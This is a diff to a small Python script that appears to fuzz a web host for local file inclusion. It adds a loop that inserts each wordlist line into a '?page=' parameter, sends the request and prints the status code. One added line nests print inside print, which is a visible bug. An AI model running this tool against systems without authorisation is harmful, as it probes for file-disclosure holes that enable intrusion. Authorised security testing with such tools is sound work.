@@ -46,25 +46,29 @@ def Fuzz():
   h = args.H.strip() #host 
   if ".php" in r.text.lower():
     time.sleep(1)
-    print(Fore.GREEN + "[:] PHP found, may be vulnerable to LFI.")
+    print(Fore.GREEN + "[:] PHP found, may be vulnerable to LFI."  + Style.RESET_ALL)
   else:
     time.sleep(1)
-    print(Fore.YELLOW + "[:] No PHP founded.")
-  if "?page=" in h:
-     time.sleep(1)
-     print(Fore.GREEN + "[:] Vulnerable parameter founded! <?page=home>")
-  else:
-     time.sleep(1)
-     print(Fore.YELLOW + "[:] No vulnerable parameters founded.")
+    print(Fore.YELLOW + "[:] No PHP founded."  + Style.RESET_ALL)
  
   #------INJECT PAYLOADS IN URL-----------
-  #open wordlist
-  with open(args.W, "r", encoding="utf-8") as f: #f = file
-    for line in f:
+
+  with open(args.W, "r", encoding="utf-8") as f: #OPEN WORDLIST : (f = file)  
+   time.sleep(1)
+   print("\n" + "-"*60 + "\n")
+   print("[:] Sending URL payload requests")
+   print("")
+   for line in f:
       payload = line.strip()
-      #create URL with the wordlist
-      newURL = args.H +"?page="+ line
-      print(newURL)
+      newURL = args.H +"?page="+ payload #create URL with the wordlist
+      r = requests.get(newURL) #r = response
+      if r.status_code == 200:
+         print(f"{r.status_code} = {Fore.GREEN + newURL + Style.RESET_ALL}")
+      else:
+         print(print(f"{r.status_code} = {Fore.RED + newURL + Style.RESET_ALL}"))
+
+
+ 
 
 
 
